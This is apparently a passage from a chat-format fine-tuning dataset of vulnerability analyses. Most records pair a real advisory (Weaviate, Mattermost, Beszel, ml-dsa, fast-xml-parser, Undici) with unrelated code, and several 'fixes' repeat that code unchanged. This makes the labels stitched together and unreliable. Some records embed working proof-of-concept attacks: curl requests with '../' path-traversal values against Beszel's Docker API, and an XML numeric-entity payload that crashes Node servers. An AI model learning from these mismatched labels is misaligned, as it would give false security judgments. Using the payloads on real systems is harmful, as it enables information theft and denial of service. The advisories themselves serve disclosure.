 OnigLen tmin;\n\n  len = 0;\n  switch (NODE_TYPE(node)) {\n  case NODE_BACKREF:\n    if (! NODE_IS_CHECKER(node)) {\n      int i;\n      int* backs;\n      MemEnv* mem_env = SCANENV_MEMENV(env);\n      BackRefNode* br = BACKREF_(node);\n      if (NODE_IS_RECURSION(node)) break;\n\n      backs = BACKREFS_P(br);\n      len = tree_min_len(mem_env[backs[0]].node, env);\n      for (i = 1; i < br->back_num; i++) {\n        tmin = tree_min_len(mem_env[backs[i]].node, env);\n        if (len > tmin) len = tmin;\n      }\n    }\n    break;\n\n#ifdef USE_CALL\n  case NODE_CALL:\n    {\n      Node* t = NODE_BODY(node);\n      if (NODE_IS_RECURSION(node)) {\n        if (NODE_IS_MIN_FIXED(t))\n          len = BAG_(t)->min_len;\n      }\n      else\n        len = tree_min_len(t, env);\n    }\n    break;\n#endif\n\n  case NODE_LIST:\n    do {\n      tmin = tree_min_len(NODE_CAR(node), env);\n      len = distance_add(len, tmin);\n    } while (IS_NOT_NULL(node = NODE_CDR(node)));\n    break;\n\n  case NODE_ALT:\n    {\n      Node *x, *y;\n      y = node;\n      do {\n        x = NODE_CAR(y);\n        tmin = tree_min_len(x, env);\n        if (y == node) len = tmin;\n        else if (len > tmin) len = tmin;\n      } while (IS_NOT_NULL(y = NODE_CDR(y)));\n    }\n    break;\n\n  case NODE_STRING:\n    {\n      StrNode* sn = STR_(node);\n      len = (int )(sn->end - sn->s);\n    }\n    break;\n\n  case NODE_CTYPE:\n  case NODE_CCLASS:\n    len = ONIGENC_MBC_MINLEN(env->enc);\n    break;\n\n  case NODE_QUANT:\n    {\n      QuantNode* qn = QUANT_(node);\n\n      if (qn->lower > 0) {\n        len = tree_min_len(NODE_BODY(node), env);\n        len = distance_multiply(len, qn->lower);\n      }\n    }\n    break;\n\n  case NODE_BAG:\n    {\n      BagNode* en = BAG_(node);\n      switch (en->type) {\n      case BAG_MEMORY:\n        if (NODE_IS_MIN_FIXED(node))\n          len = en->min_len;\n        else {\n          if (NODE_IS_MARK1(node))\n            len = 0;  /* recursive */\n          else {\n            NODE_STATUS_ADD(node, MARK1);\n            len = tree_min_len(NODE_BODY(node), env);\n            NODE_STATUS_REMOVE(node, MARK1);\n\n            en->min_len = len;\n            NODE_STATUS_ADD(node, MIN_FIXED);\n          }\n        }\n        break;\n\n      case BAG_OPTION:\n      case BAG_STOP_BACKTRACK:\n        len = tree_min_len(NODE_BODY(node), env);\n        break;\n      case BAG_IF_ELSE:\n        {\n          OnigLen elen;\n\n          len = tree_min_len(NODE_BODY(node), env);\n          if (IS_NOT_NULL(en->te.Then))\n            len += tree_min_len(en->te.Then, env);\n          if (IS_NOT_NULL(en->te.Else))\n            elen = tree_min_len(en->te.Else, env);\n          else elen = 0;\n\n          if (elen < len) len = elen;\n        }\n        break;\n      }\n    }\n    break;\n\n  case NODE_GIMMICK:\n    {\n      GimmickNode* g = GIMMICK_(node);\n      if (g->type == GIMMICK_FAIL) {\n        len = INFINITE_LEN;\n        break;\n      }\n    }\n    /* fall */\n  case NODE_ANCHOR:\n  default:\n    break;\n  }\n\n  return len;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Weaviate OSS has path traversal vulnerability via the Shard Movement API:\n\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: An issue was discovered in Weaviate OSS before 1.33.4. Due to a lack of validation of the fileName field in the transfer logic, an attacker who can call the GetFile method while a shard is in the \"Pause file activity\" state and the FileReplicationService is reachable can read arbitrary files accessible to the service process.\nFIX:\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Mattermost Server does not restrict SAML certificate path for System Administrators:\n\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          registration->application_parameter, registration->counter));\n   std::move(callback).Run(success);\n }\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: An issue was discovered in Mattermost Server before 3.7.3 and 3.6.5. A System Administrator can place a SAML certificate at an arbitrary pathname.\nFIX:\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          base::make_span<device::kRpIdHashLength>(\n              registration->application_parameter),\n          registration->counter));\n   std::move(callback).Run(success);\n }\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Mattermost Server allows users with a session ID to revoke another users' session:\n\nstatic void on_l2cap_outgoing_congest(tBTA_JV_L2CAP_CONG *p, uint32_t id)\n{\n    l2cap_socket *sock;\n\n    pthread_mutex_lock(&state_lock);\n    sock = btsock_l2cap_find_by_id_l(id);\n if (sock) {\n        sock->outgoing_congest = p->cong ? 1 : 0;\n if (!sock->outgoing_congest) {\n            APPL_TRACE_DEBUG(\"on_l2cap_outgoing_congest: adding fd to btsock_thread...\");\n            btsock_thread_add_fd(pth, sock->our_fd, BTSOCK_L2CAP, SOCK_THREAD_FD_RD, sock->id);\n\n }\n }\n    pthread_mutex_unlock(&state_lock);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-284\nREASON: An issue was discovered in Mattermost Server before 4.3.0, 4.2.1, and 4.1.2. Knowledge of a session ID allows revoking another user's session.\nFIX:\nstatic void on_l2cap_outgoing_congest(tBTA_JV_L2CAP_CONG *p, uint32_t id)\n{\n    l2cap_socket *sock;\n\n    pthread_mutex_lock(&state_lock);\n    sock = btsock_l2cap_find_by_id_l(id);\n if (sock) {\n        sock->outgoing_congest = p->cong ? 1 : 0;\n if (!sock->outgoing_congest) {\n            APPL_TRACE_DEBUG(\"on_l2cap_outgoing_congest: adding fd to btsock_thread...\");\n            btsock_thread_add_fd(pth, sock->our_fd, BTSOCK_L2CAP, SOCK_THREAD_FD_RD, sock->id);\n\n }\n }\n    pthread_mutex_unlock(&state_lock);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Beszel: Docker API has a Path Traversal Vulnerability via Unsanitized Container ID:\n\ninit_time (void)\n{\n  gettime (&initial_time);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ### Summary\n\nThe hub's authenticated API endpoints GET /api/beszel/containers/logs and GET /api/beszel/containers/info pass the user-supplied \"container\" query parameter to the agent without validation. The agent constructs Docker Engine API URLs using fmt.Sprintf with the raw value instead of url.PathEscape(). Since Go's http.Client does not sanitize ../ sequences from URL paths sent over unix sockets, an authenticated user (including readonly role) can traverse to arbitrary Docker API endpoints on agent hosts, exposing sensitive infrastructure details.\n\n### Details\n\n**Hub** (internal/hub/hub.go:407-426): `containerID` from query param is only checked for emptiness, no format validation:\n```go\ncontainerID := e.Request.URL.Query().Get(\"container\")\nif systemID == \"\" || containerID == \"\" { ... }\ndata, err := fetchFunc(system, containerID)  // passed directly to agent\n```\n\n**Agent** (agent/docker.go:651-652 and 682-683): raw containerID interpolated into Docker API URL:\n```go\nendpoint := fmt.Sprintf(\"http://localhost/containers/%s/json\", containerID)\nendpoint := fmt.Sprintf(\"http://localhost/containers/%s/logs?stdout=1&stderr=1&tail=%d\", containerID, dockerLogsTail)\n```\n\nGo's http.Client preserves `../` in paths over unix sockets (verified with test code). The Docker daemon resolves them via cleanPath, routing the request to unintended API endpoints.\n\n### PoC\n\nTested on Beszel v0.18.3 with hub and agent running in Docker (host network mode).\n```bash\n# Authenticate\nTOKEN=$(curl -s -X POST \"http://localhost:8090/api/collections/users/auth-with-password\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"identity\":\"user@example.com\",\"password\":\"password\"}' | jq -r '.token')\n\nSYSTEM=\"<system_id>\"\n\n# Path traversal: Docker version (returns full engine version, kernel, Go version)\ncurl -s \"http://localhost:8090/api/beszel/containers/info?system=$SYSTEM&container=../../version?x=\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Path traversal: Docker system info (returns hostname, OS, container count, network config)\ncurl -s \"http://localhost:8090/api/beszel/containers/info?system=$SYSTEM&container=../../info?x=\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Path traversal: List all images (triggers unmarshal error confirming traversal works)\ncurl -s \"http://localhost:8090/api/beszel/containers/info?system=$SYSTEM&container=../images/json?x=\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n```\n\nAll three requests returned real data from the Docker Engine API on the agent host.\n\n### Impact\n\nAny authenticated user (including readonly role) can read arbitrary Docker Engine API GET endpoints on all connected agent hosts. Exposed information includes: hostname, OS version, kernel version, Docker version, container inventory, image list, network topology, storage driver configuration, and security options. This is a privilege escalation, readonly users should not have access to host-level infrastructure details.\n\n## Researcher\n\nSergio Cabrera\nhttps://www.linkedin.com/in/sergio-cabrera-878766239/\nFIX:\ninit_time (void)\n{\n  gettime (&initial_time);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for ml-dsa's UseHint function has off by two error when r0 equals zero:\n\nstatic unsigned char *read_chunk(struct mschm_decompressor_p *self,\n\t\t\t\t struct mschmd_header *chm,\n\t\t\t\t struct mspack_file *fh,\n\t\t\t\t unsigned int chunk_num)\n{\n    struct mspack_system *sys = self->system;\n    unsigned char *buf;\n\n    /* check arguments - most are already checked by chmd_fast_find */\n    if (chunk_num > chm->num_chunks) return NULL;\n    \n    /* ensure chunk cache is available */\n    if (!chm->chunk_cache) {\n\tsize_t size = sizeof(unsigned char *) * chm->num_chunks;\n\tif (!(chm->chunk_cache = (unsigned char **) sys->alloc(sys, size))) {\n\t    self->error = MSPACK_ERR_NOMEMORY;\n\t    return NULL;\n\t}\n\tmemset(chm->chunk_cache, 0, size);\n    }\n\n    /* try to answer out of chunk cache */\n    if (chm->chunk_cache[chunk_num]) return chm->chunk_cache[chunk_num];\n\n    /* need to read chunk - allocate memory for it */\n    if (!(buf = (unsigned char *) sys->alloc(sys, chm->chunk_size))) {\n\tself->error = MSPACK_ERR_NOMEMORY;\n\treturn NULL;\n    }\n\n    /* seek to block and read it */\n    if (sys->seek(fh, (off_t) (chm->dir_offset + (chunk_num * chm->chunk_size)),\n\t\t      MSPACK_SYS_SEEK_START))\n    {\n\tself->error = MSPACK_ERR_SEEK;\n\tsys->free(buf);\n\treturn NULL;\n    }\n    if (sys->read(fh, buf, (int)chm->chunk_size) != (int)chm->chunk_size) {\n\tself->error = MSPACK_ERR_READ;\n\tsys->free(buf);\n\treturn NULL;\n    }\n\n    /* check the signature. Is is PMGL or PMGI? */\n    if (!((buf[0] == 0x50) && (buf[1] == 0x4D) && (buf[2] == 0x47) &&\n\t  ((buf[3] == 0x4C) || (buf[3] == 0x49))))\n    {\n\tself->error = MSPACK_ERR_SEEK;\n\tsys->free(buf);\n\treturn NULL;\n    }\n\n    /* all OK. Store chunk in cache and return it */\n    return chm->chunk_cache[chunk_num] = buf;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-682\nREASON: ### Summary\n\nThere's a bug in the `use_hint` function where it adds 1 instead of subtracting 1 when the decomposed low bits `r0` equal exactly zero. FIPS 204 Algorithm 40 is pretty clear that `r0 > 0` means strictly positive, but the current code treats zero as positive. This causes valid signatures to potentially fail verification when this edge case gets hit.\n\n### Details\n\nThe issue is in `ml-dsa/src/hint.rs` in the `use_hint` function. Here's what FIPS 204 Algorithm 40 says:\n\n```\n3: if h = 1 and r0 > 0  return (r1 + 1) mod m\n4: if h = 1 and r0 <= 0  return (r1 \u2212 1) mod m\n```\n\nLine 3 uses `r0 > 0` (strictly greater than zero), and line 4 uses `r0 <= 0` (less than or equal, which includes zero). So when `r0 = 0`, the spec says to subtract 1.\n\nBut the current implementation does this:\n\n```rust\nif h && r0.0 <= gamma2 {\n    Elem::new((r1.0 + 1) % m)\n} else if h && r0.0 >= BaseField::Q - gamma2 {\n    Elem::new((r1.0 + m - 1) % m)\n}\n```\n\nThe problem is `r0.0 <= gamma2` includes zero. When `r0 = 0`, this condition is true (since `0 <= gamma2`), so it adds 1. But according to the spec, `r0 = 0` should fall into the `r0 <= 0` case and subtract 1 instead.\n\nThe result is +1 when it should be -1, which is an off by two error mod m.\n\n### PoC\n\nTake MLDSA 44 where \u03b32 = 95,232 and m = 44.\n\nIf `use_hint(true, 0)` is called:\n- `Decompose(0)` gives `(r1=0, r0=0)`\n- The condition `r0.0 <= gamma2` is `0 <= 95232` which is true\n- So it returns `(0 + 1) % 44 = 1`\n\nBut FIPS 204 says:\n- `r0 > 0` is `0 > 0` which is false\n- `r0 \u2264 0` is `0 \u2264 0` which is true\n- So it should return `(0 - 1) mod 44 = 43`\n\nThe function returns 1 when it should return 43.\n\nThis can happen in real signatures whenever any coefficient of the `w'` vector happens to be a multiple of 2\u03b32, which makes its decomposed `r0` equal zero. It's not super common but it's definitely possible, and when it hits, verification will fail for a completely valid signature.\n\n### Impact\n\nThis is a FIPS 204 compliance bug that affects signature verification. When the edge case triggers, valid signatures get rejected. Since MLDSA is supposed to be used for high security post quantum cryptography, having verification randomly fail isn't great. It's also theoretically possible that the mismatch between what signing expects and what verification does could be exploited somehow, though that would need more looking into.\n\nThe fix is straightforward, just change the condition to explicitly check for positive values:\n\n```rust\nif h && r0.0 > 0 && r0.0 <= gamma2 {\n    Elem::new((r1.0 + 1) % m)\n} else if h {\n    Elem::new((r1.0 + m - 1) % m)\n}\n```\nFIX:\nstatic unsigned char *read_chunk(struct mschm_decompressor_p *self,\n\t\t\t\t struct mschmd_header *chm,\n\t\t\t\t struct mspack_file *fh,\n\t\t\t\t unsigned int chunk_num)\n{\n    struct mspack_system *sys = self->system;\n    unsigned char *buf;\n\n    /* check arguments - most are already checked by chmd_fast_find */\n    if (chunk_num > chm->num_chunks) return NULL;\n    \n    /* ensure chunk cache is available */\n    if (!chm->chunk_cache) {\n\tsize_t size = sizeof(unsigned char *) * chm->num_chunks;\n\tif (!(chm->chunk_cache = (unsigned char **) sys->alloc(sys, size))) {\n\t    self->error = MSPACK_ERR_NOMEMORY;\n\t    return NULL;\n\t}\n\tmemset(chm->chunk_cache, 0, size);\n    }\n\n    /* try to answer out of chunk cache */\n    if (chm->chunk_cache[chunk_num]) return chm->chunk_cache[chunk_num];\n\n    /* need to read chunk - allocate memory for it */\n    if (!(buf = (unsigned char *) sys->alloc(sys, chm->chunk_size))) {\n\tself->error = MSPACK_ERR_NOMEMORY;\n\treturn NULL;\n    }\n\n    /* seek to block and read it */\n    if (sys->seek(fh, (off_t) (chm->dir_offset + (chunk_num * chm->chunk_size)),\n\t\t      MSPACK_SYS_SEEK_START))\n    {\n\tself->error = MSPACK_ERR_SEEK;\n\tsys->free(buf);\n\treturn NULL;\n    }\n    if (sys->read(fh, buf, (int)chm->chunk_size) != (int)chm->chunk_size) {\n\tself->error = MSPACK_ERR_READ;\n\tsys->free(buf);\n\treturn NULL;\n    }\n\n    /* check the signature. Is is PMGL or PMGI? */\n    if (!((buf[0] == 0x50) && (buf[1] == 0x4D) && (buf[2] == 0x47) &&\n\t  ((buf[3] == 0x4C) || (buf[3] == 0x49))))\n    {\n\tself->error = MSPACK_ERR_SEEK;\n\tsys->free(buf);\n\treturn NULL;\n    }\n\n    /* all OK. Store chunk in cache and return it */\n    return chm->chunk_cache[chunk_num] = buf;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for fast-xml-parser has RangeError DoS Numeric Entities Bug:\n\nvoid WebContentsImpl::SendPageMessage(IPC::Message* msg) {\n  frame_tree_.root()->render_manager()->SendPageMessage(msg, nullptr);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-20\nREASON: ### Summary\nA RangeError vulnerability exists in the numeric entity processing of fast-xml-parser when parsing XML with out-of-range entity code points (e.g., `&#9999999;` or `&#xFFFFFF;`). This causes the parser to throw an uncaught exception, crashing any application that processes untrusted XML input.\n\n### Details\nThe vulnerability exists in `/src/xmlparser/OrderedObjParser.js` at lines 44-45:\n\n```javascript\n\"num_dec\": { regex: /&#([0-9]{1,7});/g, val : (_, str) => String.fromCodePoint(Number.parseInt(str, 10)) },\n\"num_hex\": { regex: /&#x([0-9a-fA-F]{1,6});/g, val : (_, str) => String.fromCodePoint(Number.parseInt(str, 16)) },\n```\n\nThe `String.fromCodePoint()` method throws a `RangeError` when the code point exceeds the valid Unicode range (0 to 0x10FFFF / 1114111). The regex patterns can capture values far exceeding this:\n- `[0-9]{1,7}` matches up to 9,999,999\n- `[0-9a-fA-F]{1,6}` matches up to 0xFFFFFF (16,777,215)\n\nThe entity replacement in `replaceEntitiesValue()` (line 452) has no try-catch:\n\n```javascript\nval = val.replace(entity.regex, entity.val);\n```\n\nThis causes the RangeError to propagate uncaught, crashing the parser and any application using it.\n### PoC\n#### Setup\n\nCreate a directory with these files:\n\n```\npoc/\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 server.js\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"fast-xml-parser\": \"^5.3.3\" } }\n```\n\n**server.js**\n```javascript\nconst http = require('http');\nconst { XMLParser } = require('fast-xml-parser');\n\nconst parser = new XMLParser({ processEntities: true, htmlEntities: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/parse') {\n    let body = '';\n    req.on('data', c => body += c);\n    req.on('end', () => {\n      const result = parser.parse(body);  // No try-catch - will crash!\n      res.end(JSON.stringify(result));\n    });\n  } else {\n    res.end('POST /parse with XML body');\n  }\n}).listen(3000, () => console.log('http://localhost:3000'));\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Send malicious payload (server will crash)\ncurl -X POST -H \"Content-Type: application/xml\" -d '<?xml version=\"1.0\"?><root>&#9999999;</root>' http://localhost:3000/parse\n``` \n#### Result\n\nServer crashes with:\n```\nRangeError: Invalid code point 9999999\n```\n\n#### Alternative Payloads\n\n```xml\n<!-- Hex variant -->\n<?xml version=\"1.0\"?><root>&#xFFFFFF;</root>\n\n<!-- In attribute -->\n<?xml version=\"1.0\"?><root attr=\"&#9999999;\"/>\n```\n\n### Impact\n*Denial of Service (DoS):** Any application using fast-xml-parser to process untrusted XML input will crash when encountering malformed numeric entities. This affects:\n\n- **API servers** accepting XML payloads\n- **File processors** parsing uploaded XML files\n- **Message queues** consuming XML messages\n- **RSS/Atom feed parsers**\n- **SOAP/XML-RPC services**\n\nA single malicious request is sufficient to crash the entire Node.js process, causing service disruption until manual restart.\nFIX:\nvoid WebContentsImpl::SendPageMessage(IPC::Message* msg) {\n  frame_tree_.root()->render_manager()->SendPageMessage(msg, nullptr);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Undici has an unbounded decompression chain in HTTP responses on Node.js Fetch API via Content-Encoding leads to resource exhaustion:\n\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location */\n\tsrv_conf = server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-770\nREASON: ### Impact\n\nThe `fetch()` API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br). This is also supported by the undici decompress interceptor.\n\nHowever, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation.\n\n### Patches\n\nUpgrade to 7.18.2 or 6.23.0.\n\n### Workarounds\n\nIt is possible to apply an undici interceptor and filter long `Content-Encoding` sequences manually.\n\n### References\n\n* https://hackerone.com/reports/3456148\n* https://github.com/advisories/GHSA-gm62-xv2j-4w53\n* https://curl.se/docs/CVE-2022-32206.html\nFIX:\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location */\n\tsrv_conf = 